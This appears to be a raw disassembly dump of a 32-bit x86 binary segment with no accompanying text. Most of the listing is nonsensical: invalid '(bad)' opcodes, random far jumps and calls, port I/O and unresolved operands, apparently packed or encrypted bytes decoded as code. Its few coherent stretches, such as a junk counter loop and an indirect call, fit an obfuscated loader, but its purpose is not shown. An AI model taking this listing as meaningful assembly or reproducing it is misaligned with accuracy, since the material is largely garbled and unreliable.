  415e22:	mov    al,ds:0xe21fc2b2
  415e28:	or     dh,dl
  415e2a:	(bad)  
  415e2b:	aas    
  415e2c:	jno    0x415e1b
  415e2e:	pop    eax
  415e2f:	test   eax,0xa454b827
  415e34:	loope  0x415e68
  415e36:	mov    esp,DWORD PTR [ecx+ebp*2-0x6e180f21]
  415e3d:	shl    eax,0xb2
  415e40:	xchg   esi,eax
  415e41:	sub    DWORD PTR [eax],edi
  415e43:	push   ds
  415e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e45:	jne    0x415e77
  415e47:	sbb    bh,BYTE PTR [edi-0x26]
  415e4a:	out    dx,al
  415e4b:	xchg   esi,eax
  415e4c:	aad    0xa2
  415e4e:	adc    bh,BYTE PTR ds:0x188362d0
  415e54:	jnp    0x415e7a
  415e56:	icebp  
  415e57:	and    eax,0xde8f9bdb
  415e5c:	adc    eax,0x1e4756ee
  415e61:	mov    ch,0x52
  415e63:	or     al,0x1a
  415e65:	cmc    
  415e66:	out    0x3b,al
  415e68:	(bad)  
  415e69:	xchg   ebx,eax
  415e6a:	or     ch,ah
  415e6c:	mov    WORD PTR [edx],cs
  415e6e:	adc    al,0x2e
  415e70:	enter  0xd9a7,0x22
  415e74:	ins    DWORD PTR es:[edi],dx
  415e75:	aaa    
  415e76:	xchg   ebp,eax
  415e77:	inc    eax
  415e78:	icebp  
  415e79:	mov    ah,0xbc
  415e7b:	(bad)  
  415e7c:	or     ah,dl
  415e7e:	ficom  DWORD PTR [ebx]
  415e80:	sub    esp,DWORD PTR [edi-0x3146df69]
  415e86:	pop    edx
  415e87:	daa    
  415e88:	push   ebx
  415e89:	cmp    cl,cl
  415e8b:	ja     0x415e90
  415e8d:	in     eax,0x6c
  415e8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e90:	push   esp
  415e91:	and    esp,DWORD PTR [ecx+0x74d05c28]
  415e97:	or     DWORD PTR [edi+edx*1+0x3527b490],eax
  415e9e:	jae    0x415ea8
  415ea0:	popf   
  415ea1:	sahf   
  415ea2:	fwait
  415ea3:	outs   dx,DWORD PTR ds:[esi]
  415ea4:	retf   
  415ea5:	dec    ebx
  415ea6:	sub    DWORD PTR [edi+0x4537442],0xffffff8c
  415ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415eae:	rcl    edi,cl
  415eb0:	mov    ds:0xf927637d,al
  415eb5:	xchg   ebx,eax
  415eb6:	push   cs
  415eb7:	into   
  415eb8:	add    esi,edi
  415eba:	xchg   esp,eax
  415ebb:	pop    ds
  415ebc:	pop    es
  415ebd:	cwde   
  415ebe:	and    al,0x87
  415ec0:	dec    edi
  415ec1:	repz mov fs,WORD PTR [eax-0x1]
  415ec5:	adc    al,0x9a
  415ec7:	sahf   
  415ec8:	and    edx,DWORD PTR [edi]
  415eca:	sti    
  415ecb:	jl     0x415e95
  415ecd:	int3   
  415ece:	jge    0x415eed
  415ed0:	mov    edi,DWORD PTR [edi+0x370cc26a]
  415ed6:	scas   al,BYTE PTR es:[edi]
  415ed7:	xchg   esi,eax
  415ed8:	and    bh,BYTE PTR [eax+0x74d91495]
  415ede:	vunpcklps xmm5,xmm3,XMMWORD PTR ds:0xcff785f6
  415ee6:	mov    DWORD PTR [ebp-0x8],eax
  415ee9:	mov    DWORD PTR ds:0x42a77d,0x6d30
  415ef3:	mov    ecx,DWORD PTR [ebp+0x8]
  415ef6:	mov    esi,0x428e
  415efb:	push   edi
  415efc:	mov    edi,0x7510850
  415f01:	mov    esi,0x378b
  415f06:	mov    esi,0x327298
  415f0b:	cmp    ecx,eax
  415f0d:	mov    DWORD PTR ds:0x42a801,0x160e
  415f17:	je     0x416abf
  415f1d:	mov    eax,DWORD PTR [ebp-0x4]
  415f20:	mov    ecx,DWORD PTR [ebp+0xc]
  415f23:	xor    eax,edi
  415f25:	sub    DWORD PTR ds:0x42a805,0x42a7c1
  415f2f:	add    eax,esi
  415f31:	cmp    eax,ecx
  415f33:	je     0x416abf
  415f39:	jmp    0x4161f1
  415f3e:	into   
  415f3f:	xlat   BYTE PTR ds:[ebx]
  415f40:	ror    cl,1
  415f42:	aad    0xc9
  415f44:	rcr    ebx,1
  415f46:	stos   BYTE PTR es:[edi],al
  415f47:	imul   edx,edx,0x31
  415f4a:	push   ds
  415f4b:	jecxz  0x415f01
  415f4d:	pop    es
  415f4e:	daa    
  415f4f:	sbb    bh,BYTE PTR [edi+0x78]
  415f52:	xchg   ebp,eax
  415f53:	jle    0x415fcd
  415f55:	js     0x415f01
  415f57:	ins    BYTE PTR es:[edi],dx
  415f58:	lock std 
  415f5a:	mov    ebp,0x54ea564
  415f5f:	test   DWORD PTR [ebx],esi
  415f61:	xchg   edi,eax
  415f62:	scas   al,BYTE PTR es:[edi]
  415f63:	popa   
  415f64:	ins    BYTE PTR es:[edi],dx
  415f65:	sub    DWORD PTR [esp+ebx*1-0x2bbc24d0],0xe2f67f6d
  415f70:	ret    0x9bd7
  415f73:	adc    al,0x69
  415f75:	pop    es
  415f76:	sbb    DWORD PTR [esp+ebx*2+0x5c],ecx
  415f7a:	and    edi,DWORD PTR [esi-0xe098d18]
  415f80:	loop   0x415fe6
  415f82:	pushf  
  415f83:	dec    edx
  415f84:	xor    ecx,DWORD PTR [edx+0x3e7e7401]
  415f8a:	adc    al,0x95
  415f8c:	fild   QWORD PTR [esi]
  415f8e:	pop    esp
  415f8f:	add    eax,0xbb87c04d
  415f94:	ja     0x415fe9
  415f96:	or     dh,BYTE PTR [edi]
  415f98:	xlat   BYTE PTR ds:[ebx]
  415f99:	enter  0xa308,0xe
  415f9d:	fst    QWORD PTR [ebp-0x7a]
  415fa0:	mov    eax,?
  415fa2:	and    BYTE PTR [edx-0x65edb9f4],bh
  415fa8:	mov    gs,WORD PTR [esi-0x5fd95f78]
  415fae:	cmp    eax,DWORD PTR [ebp+0x43]
  415fb1:	xor    DWORD PTR [esp+ebp*8-0x5d],ecx
  415fb5:	push   edi
  415fb6:	rcr    DWORD PTR [edx+0x52f8e1ef],1
  415fbc:	fnstsw WORD PTR [esi]
  415fbe:	mov    ds:0xd600e742,eax
  415fc3:	and    dh,BYTE PTR [esi+0x5f2e5f2b]
  415fc9:	mov    ah,0x31
  415fcb:	jno    0x415fcd
  415fcd:	test   BYTE PTR [ebx],al
  415fcf:	int3   
  415fd0:	ret    0xb520
  415fd3:	adc    BYTE PTR [edx+esi*2-0x41d1a03],ch
  415fda:	lock xchg ebp,eax
  415fdc:	ins    BYTE PTR es:[edi],dx
  415fdd:	scas   al,BYTE PTR es:[edi]
  415fde:	in     al,dx
  415fdf:	push   edx
  415fe0:	dec    edx
  415fe1:	and    esi,edi
  415fe3:	pop    es
  415fe4:	lahf   
  415fe5:	xchg   BYTE PTR [eax],bl
  415fe7:	push   esp
  415fe8:	pop    DWORD PTR [esi]
  415fea:	mov    eax,ds:0x709053d8
  415fef:	inc    ebp
  415ff0:	mov    ds:0xd753b932,al
  415ff5:	xchg   ebx,eax
  415ff6:	xlat   BYTE PTR ds:[ebx]
  415ff7:	sti    
  415ff8:	or     ch,cl
  415ffa:	and    DWORD PTR [esi],ecx
  415ffc:	mov    fs,esi
  415ffe:	retf   0xdd98
  416001:	in     eax,0xd6
  416003:	xor    dh,dl
  416005:	mov    ch,0xb4
  416007:	add    ecx,DWORD PTR [edi+0x7aee264e]
  41600d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41600e:	fcom   QWORD PTR [eax]
  416010:	addr16 push esp
  416012:	pusha  
  416013:	leave  
  416014:	inc    esp
  416015:	test   eax,0xc71965c4
  41601a:	pop    edi
  41601b:	cli    
  41601c:	je     0x415fa2
  41601e:	int    0xeb
  416020:	push   esi
  416021:	in     eax,dx
  416022:	retf   0x6a6
  416025:	dec    eax
  416026:	out    0xd8,al
  416028:	mov    esp,0xcee189a
  41602d:	dec    ebx
  41602e:	and    al,0x8b
  416030:	sub    DWORD PTR [esi+0x6cea82b6],ebp
  416036:	fcom   QWORD PTR [edi-0x75]
  416039:	xor    BYTE PTR [edx-0x16],0x65
  41603d:	cli    
  41603e:	pop    ebx
  41603f:	das    
  416040:	aam    0x1c
  416042:	jecxz  0x416045
  416044:	shr    DWORD PTR [edx],0xdf
  416047:	ret    
  416048:	jns    0xbd63322d
  41604e:	ror    BYTE PTR ds:0x44b4cbc9,1
  416054:	sub    al,0x0
  416056:	pusha  
  416057:	ret    0xed33
  41605a:	sub    BYTE PTR [ebp+0x24],cl
  41605d:	add    ebx,DWORD PTR [esi]
  41605f:	push   ecx
  416060:	xchg   edx,eax
  416061:	hlt    
  416062:	loopne 0x416071
  416064:	daa    
  416065:	mov    esp,0xd78346f4
  41606a:	sahf   
  41606b:	test   esi,0xb4b8e106
  416071:	fisttp DWORD PTR [edx-0x45]
  416074:	push   cs
  416075:	das    
  416076:	lahf   
  416077:	mov    al,ds:0x6f53ad52
  41607c:	pop    esp
  41607d:	adc    DWORD PTR [eax-0x65a0393e],edi
  416083:	mov    ?,WORD PTR [esp+eax*4+0x6c0b989a]
  41608a:	shl    ah,cl
  41608c:	das    
  41608d:	or     edx,ebp
  41608f:	test   BYTE PTR [edx-0x71],ah
  416092:	xchg   edi,eax
  416093:	es xchg edi,eax
  416095:	mov    al,ds:0xa0a36e8e
  41609a:	cli    
  41609b:	xchg   dx,ax
  41609d:	inc    ecx
  41609e:	dec    esi
  41609f:	jl     0x41603a
  4160a1:	ret    0x1e26
  4160a4:	add    BYTE PTR [edx],ch
  4160a6:	sbb    al,0x80
  4160a8:	pop    ebx
  4160a9:	or     cl,BYTE PTR [edx-0x4bcdd564]
  4160af:	cdq    
  4160b0:	adc    al,0x1e
  4160b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160b3:	fadd   QWORD PTR [esi+0x7415b7b9]
  4160b9:	push   cs
  4160ba:	push   es
  4160bb:	adc    ch,BYTE PTR [ebx-0x79a23f3e]
  4160c1:	add    DWORD PTR [edi],ecx
  4160c3:	das    
  4160c4:	std    
  4160c5:	inc    esp
  4160c6:	cwde   
  4160c7:	jmp    0x4e75:0x27f2d5bc
  4160ce:	or     BYTE PTR [edx+0x57],ah
  4160d1:	sbb    al,0x11
  4160d3:	bound  esi,QWORD PTR [ebx+edx*1+0x50]
  4160d7:	xor    eax,0x9533acc
  4160dc:	cld    
  4160dd:	mov    esp,0xd9c7322d
  4160e2:	es into 
  4160e4:	daa    
  4160e5:	shl    bh,cl
  4160e7:	ret    0xffec
  4160ea:	cs sub al,0xda
  4160ed:	fnsave [ebx-0x5d1c27fc]
  4160f3:	cmp    DWORD PTR [ecx-0xb],esi
  4160f6:	fcomp  DWORD PTR [edx+0x3d5a6463]
  4160fc:	mov    esi,0xc3fd3937
  416101:	std    
  416102:	pop    esp
  416103:	mov    eax,0x54dbae94
  416108:	mov    eax,ds:0xf0e8ecfe
  41610d:	js     0x416123
  41610f:	out    0xfa,eax
  416111:	dec    ebx
  416112:	sub    ch,BYTE PTR [eax]
  416114:	adc    esp,DWORD PTR [esi+0x78a2582c]
  41611a:	pop    ebp
  41611b:	arpl   WORD PTR [bx+si+0x1c],ax
  41611f:	xor    bh,cl
  416121:	mov    ebp,0x9d6219e8
  416126:	inc    ebp
  416127:	sti    
  416128:	mov    dl,0x41
  41612a:	shl    edi,1
  41612c:	adc    al,0xdd
  41612e:	jbe    0x416111
  416130:	subps  xmm0,XMMWORD PTR [ecx+eiz*8+0x2507b641]
  416138:	mov    al,ds:0xd1ba763b
  41613d:	shr    DWORD PTR [ebx-0x2c],cl
  416140:	pop    ds
  416141:	sbb    cl,ah
  416143:	cmp    bl,BYTE PTR [ecx+0x80cbbc4]
  416149:	sub    eax,0x8db855cb
  41614e:	out    dx,eax
  41614f:	cmp    al,0x88
  416151:	jp     0x416167
  416153:	jo     0x4160ea
  416155:	cmp    eax,DWORD PTR [ebx+0x232d190e]
  41615b:	xor    al,0x6
  41615d:	call   0x56b02b0a
  416162:	nop
  416163:	cmp    eax,0x8d2140bb
  416168:	jge    0x416157
  41616a:	jmp    0x90f88c7d
  41616f:	jge    0x416166
  416171:	and    al,0x2a
  416173:	shl    edi,1
  416175:	imul   ebp,DWORD PTR [eax],0xffffff9c
  416178:	cmp    edi,DWORD PTR [ebx]
  41617a:	xchg   edi,eax
  41617b:	call   0x2184:0xe74da884
  416182:	or     al,0x38
  416184:	mov    WORD PTR [esi+0x515e3d91],cs
  41618a:	aam    0x3d
  41618c:	mov    eax,ds:0x17550237
  416191:	cld    
  416192:	mov    eax,ds:0xde225d7
  416197:	or     eax,0x3073295f
  41619c:	xchg   DWORD PTR [edx+0x2d],ecx
  41619f:	out    0x3c,al
  4161a1:	retf   0x5b4c
  4161a4:	cmp    dh,BYTE PTR [ebx+0x346dd6c1]
  4161aa:	xor    ebx,ecx
  4161ac:	jl     0x416150
  4161ae:	out    0xa0,eax
  4161b0:	xor    DWORD PTR [ecx],ecx
  4161b2:	or     esi,eax
  4161b4:	xchg   ecx,eax
  4161b5:	fwait
  4161b6:	rol    DWORD PTR [edx+edi*8],cl
  4161b9:	xor    eax,0x9a25be56
  4161be:	icebp  
  4161bf:	lods   al,BYTE PTR ds:[esi]
  4161c0:	mov    al,ds:0x7f6d358
  4161c5:	lds    esi,FWORD PTR [ebx+0x62]
  4161c8:	outs   dx,DWORD PTR ds:[esi]
  4161c9:	jmp    0x416194
  4161cb:	call   0x8637:0xa1fd83e9
  4161d2:	sahf   
  4161d3:	mov    bh,0x60
  4161d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161d6:	stos   BYTE PTR es:[edi],al
  4161d7:	daa    
  4161d8:	cmc    
  4161d9:	fmul   DWORD PTR [ebp+edi*8-0x7caa20e9]
  4161e0:	or     ecx,DWORD PTR [edx+0x7a]
  4161e3:	mov    ebp,0xf3489de1
  4161e9:	dec    ebp
  4161ea:	and    esp,esp
  4161ec:	mov    ?,WORD PTR [edx-0x74f884ce]
  4161f2:	inc    ebp
  4161f3:	cld    
  4161f4:	mov    DWORD PTR ds:0x42a88d,0x1c
  4161fe:	cmp    DWORD PTR ds:0x42a88d,0x0
  416205:	je     0x41625b
  41620b:	cmp    DWORD PTR ds:0x42a88d,0xe
  416212:	jne    0x41622f
  416218:	push   0x7e45
  41621d:	push   DWORD PTR [ebp-0x1c]
  416220:	push   DWORD PTR [ebp-0xc]
  416223:	push   DWORD PTR [ebp-0x20]
  416226:	push   DWORD PTR [ebp-0x14]
  416229:	call   DWORD PTR ds:0x41d1f4
  41622f:	cmp    DWORD PTR ds:0x42a88d,0xf
  416236:	jne    0x416249
  41623c:	mov    edx,DWORD PTR ds:0x42a88d
  416242:	dec    edx
  416243:	mov    DWORD PTR ds:0x42a88d,edx
  416249:	mov    edx,DWORD PTR ds:0x42a88d
  41624f:	dec    edx
  416250:	mov    DWORD PTR ds:0x42a88d,edx
  416256:	jmp    0x4161fe
  41625b:	xor    eax,edi
  41625d:	add    eax,esi
  41625f:	add    DWORD PTR ds:0x42a769,edi
  416265:	push   eax
  416266:	push   DWORD PTR [ebp-0x8]
  416269:	push   DWORD PTR [ebp-0x4]
  41626c:	mov    edx,DWORD PTR ds:0x41eae6
  416272:	add    DWORD PTR ds:0x42a841,0x2531
  41627c:	jmp    0x416534
  416281:	ret    0x3fc0
  416284:	leave  
  416285:	leave  
  416286:	leave  
  416287:	retf   0x22c7
  41628a:	add    esp,DWORD PTR [ebx+0x7717e6ba]
  416290:	or     eax,0x787f18bc
  416295:	xchg   ebp,eax
  416296:	jle    0x416310
  416298:	js     0x416275
  41629a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41629b:	ds xchg ecx,eax
  41629d:	loop   0x4162a6
  41629f:	push   edi
  4162a0:	hlt    
  4162a1:	cmp    DWORD PTR [edi],ebx
  4162a3:	test   eax,0xa638fca7
  4162a8:	jne    0x4162c5
  4162aa:	ins    DWORD PTR es:[edi],dx
  4162ab:	adc    ecx,DWORD PTR [esi-0x36]
  4162ae:	xor    BYTE PTR [esi-0x75],ch
  4162b1:	jmp    0x7d3e:0x3d5431b8
  4162b8:	sbb    DWORD PTR [esi-0x5051aa89],0x28e12176
  4162c2:	push   DWORD PTR [edi]
  4162c4:	lods   al,BYTE PTR ds:[esi]
  4162c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c6:	lock mov cl,0xcf
  4162c9:	pop    edx
  4162ca:	mov    ecx,DWORD PTR [edx+edx*2+0x76]
  4162ce:	mov    ebx,0x7bbc7997
  4162d3:	sub    cl,bh
  4162d5:	test   eax,0x3e329d58
  4162da:	mov    dl,0xfc
  4162dc:	cmp    al,0x2d
  4162de:	mov    ah,0x81
  4162e0:	cmc    
  4162e1:	repnz loop 0x4162d3
  4162e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162e5:	lock repnz dec edi
  4162e8:	call   0x8d5154f4
  4162ed:	aam    0x8d
  4162ef:	jbe    0x41635a
  4162f1:	aam    0xf3
  4162f3:	data16 cmp dh,dl
  4162f6:	loope  0x41636d
  4162f8:	xchg   ecx,eax
  4162f9:	gs sti 
  4162fb:	sar    BYTE PTR [edx+edi*4-0x72],1
  4162ff:	stos   DWORD PTR es:[edi],eax
  416300:	sbb    al,0xa6
  416302:	retf   0x2e2f
  416305:	xchg   edx,eax
  416306:	cmp    dl,cl
  416308:	sbb    BYTE PTR [ecx],cl
  41630a:	gs push edi
  41630c:	clc    
  41630d:	adc    al,0xeb
  41630f:	je     0x4162a9
  416311:	(bad)  
  416313:	nop
  416314:	pop    esp
  416315:	fcmovne st,st(1)
  416317:	inc    eax
  416318:	out    0xce,eax
  41631a:	imul   edx,DWORD PTR [ebp-0x3ea275bc],0x3ead19a6
  416324:	pop    ss
  416325:	test   BYTE PTR [edx],ah
  416327:	pop    edx
  416328:	inc    ebp
  416329:	data16 cmp al,0x9c
  41632c:	sub    al,BYTE PTR [edi]
  41632e:	jns    0x41638b
  416330:	sti    
  416331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416332:	mov    al,ds:0x685ed285
  416337:	loopne 0x4162de
  416339:	ins    BYTE PTR es:[edi],dx
  41633a:	leave  
  41633b:	pop    es
  41633c:	push   es
  41633d:	out    dx,al
  41633e:	loope  0x416344
  416340:	scas   eax,DWORD PTR es:[edi]
  416341:	or     BYTE PTR [edi+0x6080f6f9],0x13
  416348:	dec    eax
  416349:	jne    0x4163b0
  41634b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41634c:	into   
  41634d:	cld    
  41634e:	sar    DWORD PTR [ebx],0xd4
  416351:	into   
  416352:	shr    DWORD PTR [eax+0x7b38c39a],cl
  416358:	and    dl,bl
  41635a:	repz dec ebx
  41635c:	imul   ebx,DWORD PTR [ebp+edx*4-0x78edec05],0xffffff8e
  416364:	xchg   BYTE PTR [esp+ebx*1],al
  416367:	cmc    
  416368:	and    DWORD PTR [esi+0x1970aff2],ebp
  41636e:	cmp    BYTE PTR [edi-0x5b],ah
  416371:	(bad)  
  416372:	adc    al,0x38
  416374:	(bad)  
  416375:	xlat   BYTE PTR ds:[ebx]
  416376:	out    0xda,eax
  416378:	cmp    eax,0xa224e958
  41637d:	xlat   BYTE PTR ds:[ebx]
  41637e:	test   DWORD PTR [ebx-0x7b],edi
  416381:	adc    DWORD PTR [edi+0x11],esi
  416384:	xor    ebp,ecx
  416386:	xchg   esi,eax
  416387:	mov    bh,BYTE PTR ds:0x9d346816
  41638d:	retf   
  41638e:	hlt    
  41638f:	sbb    bh,BYTE PTR [edi-0x7893ddf1]
  416395:	mov    WORD PTR [edi+edi*2],ds
  416398:	xchg   edi,eax
  416399:	push   ss
  41639a:	pop    ecx
  41639b:	aaa    
  41639c:	fwait
  41639d:	xor    DWORD PTR ds:0x939d85ce,edx
  4163a3:	out    0x9a,al
  4163a5:	mov    esi,0x44e8edb4
  4163aa:	(bad)  
  4163ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163ac:	pop    ebx
  4163ad:	push   cs
  4163ae:	ja     0x4163ad
  4163b0:	call   0xc7ff24f3
  4163b5:	scas   al,BYTE PTR es:[edi]
  4163b6:	push   edx
  4163b7:	xor    dh,BYTE PTR [ebx+eax*2]
  4163ba:	xor    al,0x55
  4163bc:	fistp  QWORD PTR [esp+esi*1]
  4163bf:	aaa    
  4163c0:	dec    esp
  4163c1:	or     ah,ch
  4163c3:	jg     0x4163c2
  4163c5:	inc    edi
  4163c6:	fstp   QWORD PTR [edx+0x23]
  4163c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163ca:	dec    esi
  4163cb:	push   edi
  4163cc:	sbb    eax,0x1589780a
  4163d1:	(bad)  
  4163d3:	mov    ebx,0x97efa592
  4163d8:	rol    ebp,0x26
  4163db:	push   edi
  4163dc:	jmp    0x4163a4
  4163de:	(bad)
  4163e1:	lods   al,BYTE PTR ds:[esi]
  4163e2:	sbb    eax,0x10f5d93b
  4163e7:	add    al,bl
  4163e9:	dec    ebp
  4163ea:	repnz in eax,0xfd
  4163ed:	push   esp
  4163ee:	push   esp
  4163ef:	mov    dh,0x60
  4163f1:	pop    edi
  4163f2:	in     al,0x9d
  4163f4:	lods   al,BYTE PTR ds:[esi]
  4163f5:	sbb    DWORD PTR [ebx+0x48914027],0x76
  4163fc:	in     al,dx
  4163fd:	xchg   ebx,eax
  4163fe:	imul   edi,DWORD PTR [edx-0x434e68f0],0xf88bbd61
  416408:	adc    al,0xeb
  41640a:	mov    ds:0x757646e,eax
  41640f:	mov    ?,ecx
  416411:	clc    
  416412:	push   es
  416413:	jmp    0x34cc:0x21e6d737
  41641a:	mov    edx,0x9b4dba15
  41641f:	mov    fs,edx
  416421:	pop    es
  416422:	jg     0x4163d7
  416424:	mov    bl,0xa7
  416426:	add    bl,BYTE PTR [eax]
  416428:	pop    edi
  416429:	mov    ecx,DWORD PTR [ecx+0x785e1f68]
  41642f:	add    eax,0x2bf01f69
  416434:	and    ch,BYTE PTR [edi]
  416436:	push   eax
  416437:	out    dx,eax
  416438:	sub    esp,DWORD PTR [edi-0x2b86d9e4]
  41643e:	mov    DWORD PTR ds:0x51057861,ebp
  416444:	xor    DWORD PTR [ebx-0x73],ecx
  416447:	lds    edi,FWORD PTR [eax+0x70]
  41644a:	jg     0x4163f1
  41644c:	loope  0x41642c
  41644e:	inc    ecx
  416450:	mov    ebp,0x1d7209f9
  416455:	outs   dx,DWORD PTR ds:[esi]
  416456:	add    DWORD PTR fs:[esi+0x25b39eca],ecx
  41645d:	sar    BYTE PTR [edi],1
  41645f:	mov    edx,0x9b951388
  416464:	and    ebx,esp
  416466:	adc    eax,0xcf08acd1
  41646c:	pop    ss
  41646d:	jns    0x41644d
  41646f:	cdq    
  416470:	cmc    
  416471:	sub    DWORD PTR [edi+0xb],edi
  416474:	pop    ecx
  416475:	mov    eax,edx
  416477:	add    al,0xe8
  416479:	inc    ecx
  41647a:	inc    esi
  41647b:	push   esp
  41647c:	dec    ebp
  41647d:	pop    esp
  41647e:	xchg   ecx,eax
  41647f:	es mov bl,0xef
  416482:	mov    eax,DWORD PTR [ebp-0x7a]
  416485:	rcl    BYTE PTR [eax-0x1f],1
  416488:	xor    DWORD PTR [eax-0x59],ebp
  41648b:	mov    edx,0xd8e4aa6a
  416490:	pushf  
  416491:	mov    edi,0x1dd6754c
  416496:	ins    DWORD PTR es:[edi],dx
  416497:	adc    dl,BYTE PTR [edx-0x1e3795b3]
  41649d:	inc    eax
  41649e:	pop    ecx
  41649f:	adc    dl,al
  4164a1:	jmp    0x7962f8bc
  4164a6:	push   edi
  4164a7:	das    
  4164a8:	add    eax,0xdbe1917
  4164ad:	das    
  4164ae:	(bad)  
  4164af:	ror    ecx,1
  4164b1:	dec    esi
  4164b2:	pusha  
  4164b3:	inc    ebx
  4164b4:	add    ch,BYTE PTR ss:[edx+0x7ce3ac1c]
  4164bb:	dec    esi
  4164bc:	adc    DWORD PTR [esi+0x77],ebx
  4164bf:	mov    al,0xc4
  4164c1:	bound  ebp,QWORD PTR [ebx]
  4164c3:	mov    esp,0x3ee1bec3
  4164c8:	pop    ebp
  4164c9:	sbb    eax,0x186c2b17
  4164ce:	cmp    al,0x2d
  4164d0:	xchg   esi,eax
  4164d1:	and    eax,0x6f938136
  4164d6:	enter  0xe88,0x80
  4164da:	ret    0xf478
  4164dd:	xchg   ecx,eax
  4164de:	outs   dx,DWORD PTR ds:[esi]
  4164df:	xor    ah,bh
  4164e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164e2:	lods   eax,DWORD PTR ds:[esi]
  4164e3:	adc    ecx,DWORD PTR [ebx+0x4c715b85]
  4164e9:	popa   
  4164ea:	(bad)  
  4164ec:	mov    al,ds:0xb107ef71
  4164f1:	test   eax,0xe1821436
  4164f6:	mov    al,0x6a
  4164f8:	into   
  4164f9:	int3   
  4164fa:	pop    eax
  4164fb:	stos   BYTE PTR es:[edi],al
  4164fc:	loop   0x4164a5
  4164fe:	ss cmp al,0xaf
  416501:	jne    0x4164d2
  416503:	test   al,0xe5
  416505:	fldenv [ecx]
  416507:	in     al,dx
  416508:	sub    bh,BYTE PTR [ebx+0x5a]
  41650b:	hlt    
  41650c:	inc    ecx
  41650d:	(bad)  
  41650e:	loopne 0x416535
  416510:	and    ecx,DWORD PTR [eax-0x56497f11]
  416516:	ror    DWORD PTR fs:[edx+0x4d],0xa5
  41651b:	push   0x33
  41651d:	cdq    
  41651e:	mov    dh,0x5
  416520:	cld    
  416521:	mov    dh,0x75
  416523:	ror    DWORD PTR [edx+0x2b5f63d7],1
  416529:	ins    BYTE PTR es:[edi],dx
  41652a:	sbb    dh,BYTE PTR [esi-0x1c]
  41652d:	mov    WORD PTR [edi],dx
  416530:	inc    esp
  416531:	daa    
  416532:	retf   
  416533:	fld1   
  416535:	xor    bl,BYTE PTR [eax]
  416537:	add    BYTE PTR [eax],al
  416539:	mov    ecx,DWORD PTR ds:0x41eae6
  41653f:	mov    ecx,DWORD PTR [ecx+0x1cc]
  416545:	jmp    0x4167fd
  41654a:	ret    
  41654b:	int3   
  41654c:	(bad)  
  41654d:	int3   
  41654e:	aad    0xda
  416550:	leave  
  416551:	rol    DWORD PTR [ebp+0x67e37c66],cl
  416557:	mov    ecx,ebp
  416559:	and    ebx,ecx
  41655b:	sbb    eax,0x7e95787f
  416560:	js     0x4165da
  416562:	shl    DWORD PTR [esi+esi*8],0x44
  416566:	cwde   
  416567:	(bad)  
  416569:	push   0xe2d391fe
  41656e:	jmp    0x4165b4
  416570:	sub    DWORD PTR [edx+0x3d4033ee],0xffffff95
  416577:	ja     0x4165dc
  416579:	iret   
  41657a:	inc    ecx
  41657b:	pusha  
  41657c:	sub    al,0x45
  41657e:	gs adc edi,ebp
  416581:	sbb    al,0xb3
  416583:	mov    dl,0x4d
  416585:	mov    ebp,0x4852347d
  41658a:	jbe    0x4165e0
  41658c:	dec    esp
  41658d:	cmp    ah,BYTE PTR [esi]
  41658f:	rcr    ebx,1
  416591:	adc    eax,0xf2f47407
  416596:	inc    edx
  416597:	push   es
  416598:	mov    ch,0x3e
  41659a:	sbb    ch,dh
  41659c:	daa    
  41659d:	dec    esp
  41659e:	jb     0x41652e
  4165a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165a1:	push   ebp
  4165a2:	mov    edi,0x7c697d38
  4165a7:	cmp    DWORD PTR [ebx-0x4495fa15],esp
  4165ad:	int3   
  4165ae:	sub    eax,0x90cf42cb
  4165b3:	out    dx,al
  4165b4:	jecxz  0x416567
  4165b6:	xor    dh,ch
  4165b8:	cmp    dl,BYTE PTR [eax+0x196f9d3a]
  4165be:	inc    esp
  4165bf:	call   0x460e:0x35adefde
  4165c6:	push   es
  4165c7:	(bad)  
  4165c8:	neg    edx
  4165ca:	mov    esi,0x2cc96879
  4165cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165d0:	mov    esp,0xa1cda500
  4165d5:	(bad)  
  4165d6:	sub    al,0x57
  4165d8:	add    DWORD PTR [edx-0x6154c281],ebp
  4165de:	fadd   DWORD PTR [esi]
  4165e0:	xchg   ebp,eax
  4165e1:	add    bh,dl
  4165e3:	rcl    DWORD PTR [edi+0x722bf7cd],0x46
  4165ea:	icebp  
  4165eb:	out    0xf3,al
  4165ed:	loope  0x4165a3
  4165ef:	sub    DWORD PTR ds:0x4a603914,esp
  4165f5:	mov    esp,0xc692cf94
  4165fa:	inc    ebx
  4165fb:	inc    edx
  4165fc:	xor    edx,edx
  4165fe:	jmp    0xd973e5da
  416603:	adc    eax,DWORD PTR [esi]
  416605:	lods   al,BYTE PTR ds:[esi]
  416606:	xchg   DWORD PTR [edi+0x66],esi
  416609:	lock xlat BYTE PTR ds:[ebx]
  41660b:	mov    bl,0xd4
  41660d:	loop   0x41665a
  41660f:	pop    edx
  416610:	mov    ch,0x24
  416612:	jno    0x41659c
  416614:	lds    edx,FWORD PTR [ecx]
  416616:	ror    DWORD PTR [ecx+0x2],cl
  416619:	sahf   
  41661a:	mov    edi,0x6c760dba
  41661f:	in     eax,0xd5
  416621:	out    dx,al
  416622:	dec    edi
  416623:	aas    
  416624:	pop    ebx
  416625:	call   0x4914:0xa8715892
  41662c:	iret   
  41662d:	add    eax,ecx
  41662f:	or     DWORD PTR [edi-0x42],esi
  416632:	jae    0x4165c2
  416634:	mov    al,0x30
  416636:	sbb    ah,dl
  416638:	cmc    
  416639:	(bad)  
  41663a:	aaa    
  41663b:	jl     0x4165f0
  41663d:	pusha  
  41663e:	imul   ecx,DWORD PTR [ebx],0x7a
  416641:	cmp    cl,BYTE PTR [esi]
